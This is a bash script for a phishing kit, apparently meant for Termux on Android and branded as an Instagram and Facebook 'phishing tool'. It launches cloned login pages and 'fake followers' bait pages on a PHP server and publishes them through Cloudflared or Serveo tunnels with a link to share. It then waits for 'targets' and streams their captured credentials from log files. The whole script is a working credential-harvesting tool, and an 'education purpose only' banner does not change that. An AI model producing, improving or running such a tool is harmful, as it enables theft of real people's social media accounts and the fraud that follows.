#!/bin/bash

R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'; B='\033[0;34m'
P='\033[0;35m'; C='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

clear

# Matrix Boot Animation
echo -e "${G}${BOLD}"
for i in {1..5}; do
    echo -ne "█▓▒░ Initializing PhishNet System ░▒▓█"
    sleep 0.15
    echo -ne "\r                                   \r"
    sleep 0.1
done

# Banner
echo -e "${R}${BOLD}"
cat << "EOF"
╔══════════════════════════════════════════════════════════╗
║     ██████╗ ██╗  ██╗██╗███████╗██╗███╗   ██╗ ██████╗     ║
║     ██╔══██╗██║  ██║██║██╔════╝██║████╗  ██║██╔════╝     ║
║     ██████╔╝███████║██║███████╗██║██╔██╗ ██║██║  ███╗    ║
║     ██╔═══╝ ██╔══██║██║╚════██║██║██║╚██╗██║██║   ██║    ║
║     ██║     ██║  ██║██║███████║██║██║ ╚████║╚██████╔╝    ║
║     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ║
╚══════════════════════════════════════════════════════════╝
EOF
echo -e "${RESET}"

echo -e "${C}${BOLD}════════════════════════════════════════════════════${RESET}"
echo -e "${Y}${BOLD}               DEVELOPER: AYUSH${RESET}"
echo -e "${B}${BOLD}               INSTAGRAM: @ayush_offlcial_${RESET}"
echo -e "${R}${BOLD}               ⚠️  FOR EDUCATION PURPOSE ONLY  ⚠️${RESET}"
echo -e "${C}${BOLD}════════════════════════════════════════════════════${RESET}"
echo ""

# Loading Bar
echo -ne "${G}["
for i in {1..40}; do
    echo -ne "▓"
    sleep 0.02
done
echo -e "] 100%${RESET}"
echo ""

SCRIPT_DIR="/storage/emulated/0/phish_tool"

# Ensure all directories have proper permissions
chmod -R 777 "$SCRIPT_DIR" 2>/dev/null

# Cleanup function
cleanup() {
    echo -e "\n${Y}Shutting down servers...${RESET}"
    pkill -f php 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    pkill -f ssh 2>/dev/null
    exit 0
}
trap cleanup INT

# View logs function
view_logs() {
    clear
    echo -e "${R}${BOLD}"
    echo "╔════════════════════════════════════════╗"
    echo "║         📜 CAPTURED LOGS 📜           ║"
    echo "╚════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo ""
    echo -e "${Y}[1] Instagram Login${RESET}"
    echo -e "${Y}[2] Instagram Fake Followers${RESET}"
    echo -e "${Y}[3] Facebook Login${RESET}"
    echo -e "${Y}[4] Facebook Fake Followers${RESET}"
    echo -e "${Y}[5] All Logs${RESET}"
    echo -e "${R}[6] Back${RESET}"
    read -p $'\e[36m➤ \e[0m' opt
    echo ""
    case $opt in
        1) cat "$SCRIPT_DIR/instagram_login/log.txt" 2>/dev/null || echo -e "${R}No logs found${RESET}" ;;
        2) cat "$SCRIPT_DIR/instagram_followers/log.txt" 2>/dev/null || echo -e "${R}No logs found${RESET}" ;;
        3) cat "$SCRIPT_DIR/facebook_login/log.txt" 2>/dev/null || echo -e "${R}No logs found${RESET}" ;;
        4) cat "$SCRIPT_DIR/facebook_followers/log.txt" 2>/dev/null || echo -e "${R}No logs found${RESET}" ;;
        5) 
            echo -e "${C}═══════════════════════════════════${RESET}"
            echo -e "${C}=== INSTAGRAM LOGIN ===${RESET}"
            cat "$SCRIPT_DIR/instagram_login/log.txt" 2>/dev/null || echo "No logs"
            echo -e "${C}=== INSTAGRAM FAKE FOLLOWERS ===${RESET}"
            cat "$SCRIPT_DIR/instagram_followers/log.txt" 2>/dev/null || echo "No logs"
            echo -e "${C}=== FACEBOOK LOGIN ===${RESET}"
            cat "$SCRIPT_DIR/facebook_login/log.txt" 2>/dev/null || echo "No logs"
            echo -e "${C}=== FACEBOOK FAKE FOLLOWERS ===${RESET}"
            cat "$SCRIPT_DIR/facebook_followers/log.txt" 2>/dev/null || echo "No logs"
            ;;
        6) return ;;
        *) echo -e "${R}Invalid option${RESET}" ;;
    esac
    echo "" && read -p "Press Enter..."
}

# Cloudflared Tunnel
start_cf() {
    local dir=$1
    cd "$dir"
    
    clear
    echo -e "${G}${BOLD}┌─────────────────────────────────────┐${RESET}"
    echo -e "${G}${BOLD}│     🌐 CLOUDFLARED TUNNEL          │${RESET}"
    echo -e "${G}${BOLD}└─────────────────────────────────────┘${RESET}"
    echo ""
    
    echo -e "${Y}[*] Starting PHP Server...${RESET}"
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    echo -e "${G}[✓] PHP Server Started (Port 8080)${RESET}"
    echo ""
    
    echo -e "${Y}[*] Starting Cloudflared Tunnel...${RESET}"
    echo -e "${C}[!] Please wait 15-20 seconds for link generation${RESET}"
    echo ""
    
    (cloudflared tunnel --url http://localhost:8080 2>&1) &
    CF_PID=$!
    
    sleep 12
    
    LINK=$(ps aux | grep cloudflared | grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' | head -1)
    
    if [[ -n "$LINK" ]]; then
        echo -e "${G}════════════════════════════════════════════════════${RESET}"
        echo -e "${C}${BOLD}🌐 YOUR CLOUDFLARED LINK (SHARE THIS)${RESET}"
        echo -e "${Y}${BOLD}$LINK${RESET}"
        echo -e "${G}════════════════════════════════════════════════════${RESET}"
        echo ""
        echo -e "${R}⚠️  Ctrl+C to stop server${RESET}"
        echo -e "${Y}📁 Option 3 to view logs${RESET}"
        echo ""
    else
        echo -e "${R}[!] Link generation taking longer... waiting 10 more seconds${RESET}"
        sleep 10
        LINK=$(ps aux | grep cloudflared | grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' | head -1)
        if [[ -n "$LINK" ]]; then
            echo -e "${G}════════════════════════════════════════════════════${RESET}"
            echo -e "${C}${BOLD}🌐 YOUR CLOUDFLARED LINK${RESET}"
            echo -e "${Y}${BOLD}$LINK${RESET}"
            echo -e "${G}════════════════════════════════════════════════════${RESET}"
        fi
    fi
    
    echo -e "\n${C}[*] Waiting for targets...${RESET}"
    tail -f "$dir/log.txt" 2>/dev/null | while read line; do
        echo -e "${R}[✓] ${Y}$line${RESET}"
    done
}

# Serveo Tunnel
start_serveo() {
    local dir=$1
    cd "$dir"
    
    clear
    echo -e "${G}${BOLD}┌─────────────────────────────────────┐${RESET}"
    echo -e "${G}${BOLD}│        🌐 SERVEO TUNNEL            │${RESET}"
    echo -e "${G}${BOLD}└─────────────────────────────────────┘${RESET}"
    echo ""
    
    echo -e "${Y}[*] Starting PHP Server...${RESET}"
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    echo -e "${G}[✓] PHP Server Started (Port 8080)${RESET}"
    echo ""
    
    echo -e "${Y}[*] Starting Serveo Tunnel...${RESET}"
    echo -e "${C}[!] Please wait...${RESET}"
    echo ""
    
    (ssh -R 80:localhost:8080 serveo.net 2>&1) &
    SSH_PID=$!
    
    sleep 8
    
    LINK=$(ps aux | grep serveo | grep -oP 'https://[a-zA-Z0-9.-]+\.serveo\.net' | head -1)
    
    if [[ -n "$LINK" ]]; then
        echo -e "${G}════════════════════════════════════════════════════${RESET}"
        echo -e "${C}${BOLD}🌐 YOUR SERVEO LINK (SHARE THIS)${RESET}"
        echo -e "${Y}${BOLD}$LINK${RESET}"
        echo -e "${G}════════════════════════════════════════════════════${RESET}"
        echo ""
        echo -e "${R}⚠️  Ctrl+C to stop server${RESET}"
        echo -e "${Y}📁 Option 3 to view logs${RESET}"
        echo ""
    else
        echo -e "${R}[!] Serveo may be down. Try Cloudflared option.${RESET}"
    fi
    
    echo -e "\n${C}[*] Waiting for targets...${RESET}"
    tail -f "$dir/log.txt" 2>/dev/null | while read line; do
        echo -e "${R}[✓] ${Y}$line${RESET}"
    done
}

# Localhost
start_local() {
    local dir=$1
    cd "$dir"
    
    clear
    echo -e "${G}${BOLD}┌─────────────────────────────────────┐${RESET}"
    echo -e "${G}${BOLD}│        📍 LOCALHOST TUNNEL         │${RESET}"
    echo -e "${G}${BOLD}└─────────────────────────────────────┘${RESET}"
    echo ""
    
    echo -e "${Y}[*] Starting PHP Server...${RESET}"
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    echo -e "${G}[✓] PHP Server Started (Port 8080)${RESET}"
    echo ""
    
    LOCAL_IP=$(ip addr show | grep -oP '192\.168\.[0-9]+\.[0-9]+' | head -1)
    
    echo -e "${G}════════════════════════════════════════════════════${RESET}"
    echo -e "${C}📍 LOCALHOST URLS${RESET}"
    echo -e "${Y}→ http://localhost:8080${RESET}"
    echo -e "${Y}→ http://127.0.0.1:8080${RESET}"
    [[ -n "$LOCAL_IP" ]] && echo -e "${Y}→ http://$LOCAL_IP:8080 (Same WiFi)${RESET}"
    echo -e "${G}════════════════════════════════════════════════════${RESET}"
    echo ""
    echo -e "${R}⚠️  Localhost only works on same WiFi${RESET}"
    echo -e "${Y}📁 Option 3 to view logs | Ctrl+C to stop${RESET}"
    echo ""
    
    echo -e "${C}[*] Waiting for targets...${RESET}"
    tail -f "$dir/log.txt" 2>/dev/null | while read line; do
        echo -e "${R}[✓] ${Y}$line${RESET}"
    done
}

# Main Menu
while true; do
    echo ""
    echo -e "${P}${BOLD}┌─────────────────────────────────────┐${RESET}"
    echo -e "${P}${BOLD}│         🎯 PHISHING TOOL           │${RESET}"
    echo -e "${P}${BOLD}└─────────────────────────────────────┘${RESET}"
    echo ""
    echo -e "${G}${BOLD}[1]${RESET} 📸 Instagram"
    echo -e "${G}${BOLD}[2]${RESET} 🔵 Facebook"
    echo -e "${C}${BOLD}[3]${RESET} 📜 View Logs"
    echo -e "${R}${BOLD}[4]${RESET} ❌ Exit"
    echo ""
    read -p $'\e[36m┌─[root@phish]─[~]\n└──╼ $ \e[0m' main

    [[ $main == "4" ]] && cleanup
    [[ $main == "3" ]] && view_logs && continue

    echo ""
    echo -e "${G}[1] Login Page Clone${RESET}"
    echo -e "${G}[2] Fake Followers Page${RESET}"
    read -p $'\e[36m➤ \e[0m' sub

    if [[ $main == "1" ]]; then
        [[ $sub == "1" ]] && PAGE_DIR="$SCRIPT_DIR/instagram_login"
        [[ $sub == "2" ]] && PAGE_DIR="$SCRIPT_DIR/instagram_followers"
    else
        [[ $sub == "1" ]] && PAGE_DIR="$SCRIPT_DIR/facebook_login"
        [[ $sub == "2" ]] && PAGE_DIR="$SCRIPT_DIR/facebook_followers"
    fi

    echo ""
    echo -e "${C}${BOLD}┌─────────────────────────────────────┐${RESET}"
    echo -e "${C}${BOLD}│         🌐 SELECT TUNNEL           │${RESET}"
    echo -e "${C}${BOLD}└─────────────────────────────────────┘${RESET}"
    echo ""
    echo -e "${G}[1] Cloudflared (Public - Everyone)${RESET}"
    echo -e "${G}[2] Serveo (Public - Alternative)${RESET}"
    echo -e "${G}[3] Localhost (Same WiFi Only)${RESET}"
    read -p $'\e[36m➤ \e[0m' tunnel

    case $tunnel in
        1) start_cf "$PAGE_DIR" ;;
        2) start_serveo "$PAGE_DIR" ;;
        3) start_local "$PAGE_DIR" ;;
    esac
done